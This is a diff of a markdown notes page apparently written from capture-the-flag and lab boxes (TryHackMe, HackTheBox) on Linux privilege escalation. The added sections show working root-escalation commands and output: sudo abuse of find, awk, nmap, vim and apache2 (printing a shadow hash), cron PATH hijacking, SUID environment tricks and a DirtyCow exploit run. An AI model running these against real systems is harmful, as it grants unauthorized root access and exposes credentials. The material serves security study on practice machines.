@@ -10,34 +10,138 @@ math: true
 
 # SUID binaries found with `sudo -l` for privilege escalation:
 
-## using a simple binary to execute commands through: - htb tenten
 
-We run `sudo -l` to check if we have any privs for running things as sudo and it turns out that we do.
+## tryhackme linux priv esc arena:
+
+
+Running `sudo -l` returns a few options of things we can run so we will find a way to exploit each one:
 ```bash
-takis@tenten:~$ sudo -l
-Matching Defaults entries for takis on tenten:
+TCM@debian:~$ sudo -l
+Matching Defaults entries for TCM on this host:
+    env_reset, env_keep+=LD_PRELOAD
+
+User TCM may run the following commands on this host:
+    (root) NOPASSWD: /usr/sbin/iftop
+    (root) NOPASSWD: /usr/bin/find
+    (root) NOPASSWD: /usr/bin/nano
+    (root) NOPASSWD: /usr/bin/vim
+    (root) NOPASSWD: /usr/bin/man
+    (root) NOPASSWD: /usr/bin/awk
+    (root) NOPASSWD: /usr/bin/less
+    (root) NOPASSWD: /usr/bin/ftp
+    (root) NOPASSWD: /usr/bin/nmap
+    (root) NOPASSWD: /usr/sbin/apache2
+    (root) NOPASSWD: /bin/more
+
+```
+#### Exploiting file as sudo:
+```bash
+TCM@debian:~$ sudo find /bin -name nano -exec /bin/sh \;
+sh-4.1# whoami
+root
+```
+#### Exploiting awk as sudo:
+```bash
+TCM@debian:~$ sudo awk 'BEGIN {system("/bin/sh")}'
+sh-4.1# whoami
+root
+```
+#### Exploiting nmap:
+
+```bash
+TCM@debian:~$ echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse
+
+Starting Nmap 5.00 ( http://nmap.org ) at 2020-06-30 10:18 EDT
+sh-4.1# whoami
+root
+```
+
+#### Exploiting vim as sudo:
+```bash
+:!sh
+sh-4.1# whoami
+root
+```
+#### Exploiting apache2 as sudo:
+```bash
+TCM@debian:~$ sudo apache2 -f /etc/shadow                                                                                                                            
+Syntax error on line 1 of /etc/shadow:
+Invalid command 'root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::'
+```
+Then crack creds with john.
+
+#### Crontab path exploit:
+
+```bash
+TCM@debian:~$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+* * * * * root overwrite.sh
+* * * * * root /usr/local/bin/compress.sh
+
+TCM@debian:~$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
+TCM@debian:~$ chmod +x /home/user/overwrite.sh
+TCM@debian:~$ /tmp/bash -p
+bash-4.1# whoami
+root
+
+
+```
+
+#### Litlle trick with getcap and python to priv esc:
+```bash
+TCM@debian:~$ getcap -r / 2>/dev/null
+TCM@debian:~$ /usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+root@debian:~#
+```
+
+#### Using SUID envoronment variables:
+```bash
+TCM@debian:~$ echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
+TCM@debian:~$ gcc /tmp/service.c -o /tmp/service
+TCM@debian:~$  export PATH=/tmp:$PATH
+TCM@debian:~$ /usr/local/bin/suid-env
+root@debian:~# whoami
+root
+```
+we can also do:
+```bash
+env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'
+bash-4.1# whoami
+root
+```
+
+## tryhackme pentest box, the most simlpe priv esc with `sudo -l` to show us we can run anything as root so we can simply su.
+
+```bash
+kay@basic2:~$ sudo -l
+[sudo] password for kay: 
+Matching Defaults entries for kay on basic2:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
-User takis may run the following commands on tenten:
+User kay may run the following commands on basic2:
     (ALL : ALL) ALL
-    (ALL) NOPASSWD: /bin/fuckin
-```
-we can see here that the user can run the file `fuckin` as root.
-
-We experiment with what the file can do and we realise that we can simply specify the command after the file, we willl use this to read the root flag.
-```bash
-takis@tenten:~$ fuckin cat /root/root.txt
-cat: /root/root.txt: Permission denied
-takis@tenten:~$ fuckin id
-uid=1000(takis) gid=1000(takis) groups=1000(takis),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),117(lpadmin),118(sambashare)
-takis@tenten:~$ sudo fuckin id
-uid=0(root) gid=0(root) groups=0(root)
-takis@tenten:~$ sudo fuckin cat /root/root.txt
-f9f7291e39a9a2a011b1425c3e08f603
-takis@tenten:~$ 
+kay@basic2:~$ sudo su root
+root@basic2:/home/kay# whoami
+root
 ```
 
 ## openadmin htb - using nano to get a shell:
+
+ ROOT
 
 We run `sudo -l` as always when we are trying to priv esc to see if we can run anything as sudo.
 ```bash
@@ -75,19 +179,7 @@ root.txt: not found
 2f907ed450b361b2c2bf4e8795d5b561
 ```
 
-## tryhackme pentest box, the most simlpe priv esc with `sudo -l` to show us we can run anything as root so we can simply su.
-```bash
-kay@basic2:~$ sudo -l
-[sudo] password for kay: 
-Matching Defaults entries for kay on basic2:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
-User kay may run the following commands on basic2:
-    (ALL : ALL) ALL
-kay@basic2:~$ sudo su root
-root@basic2:/home/kay# whoami
-root
-```
 ## tryhackme lazy-admin box - sudo -l - perl priv-esc
 
 ```bash
@@ -132,7 +224,7 @@ uid=0(root) gid=0(root) groups=0(root)
 THM{6637f41d0177b6f37cb20d775124699f}
 ```
 
-## Priv esc with mounting file system on docker - htb ariekei:
+## Priv esc with mounting file system on docker:
 
 Running `id` confirms that the user is part of a docker group, we will see if we can exploit this.
 ```bash
@@ -293,7 +385,9 @@ Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)
 
 kay@basic2:~$
 ```
+And here we managed to get into the system as the user.
 
+## Git show on git logs to reveal a private ssh key - devOops box htb
 
 as we ssh we find that there is a git directory in `/home/roosa/work/blogfeed/.git` we run `git log` to see if we find anything interesting and luckily we do.
 ```bash
@@ -303,9 +397,9 @@ Date:   Mon Mar 19 09:33:06 2018 -0400
 
 	reverted accidental commit with proper key
 ```
-This means that the user had an old ssh key reverted(its the root ssh key) so we need to try and find a way to get this. We run: `git show 33e87c312c08735a02fa9c796021a4a3023129ad` and it shows us the root key, We copy it to our box once again, give it appropriate permissions and ssh as root.
+This means that the user had an old ssh key reverted(its the root ssh key) so we need to try and find a way to get this. We run `git show 33e87c312c08735a02fa9c796021a4a3023129ad `and it shows us the root key, We copy it to our box once again, give it appropriate permissions and ssh as root.
 
-## simple ret2libc exploit to get a root shell - htb frolic
+## simple ret2libc exploit to get a root shell
 
 We find an SUID binary in /home/ayush/.binary, its called rop
 we run it to see what it does, basically it just takes our input and outputs it. 
@@ -437,6 +531,33 @@ root
 1703b8a3c9a8dde879942c79d02fd3a0
 ```
 
+## Using dirtycow
 
+we can test to see if the kernel for that machine is vulnrable by running an exploit suggestor and if it comes up with dirty cow we can abuse it like this:
+```bash
+TCM@debian:~$ ./c0w
+                                
+   (___)                                   
+   (o o)_____/                             
+    @@ `     \                            
+     \ ____, //usr/bin/passwd                          
+     //    //                              
+    ^^    ^^                               
+DirtyCow root privilege escalation
+Backing up /usr/bin/passwd to /tmp/bak
+mmap 9ca4000
 
+madvise 0
+
+ptrace 0
+
+TCM@debian:~$ whoami
+TCM
+TCM@debian:~$ id
+uid=1000(TCM) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
+TCM@debian:~$ passwd
+root@debian:/home/user# id && whoami
+uid=0(root) gid=1000(user) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
+root
+```
 
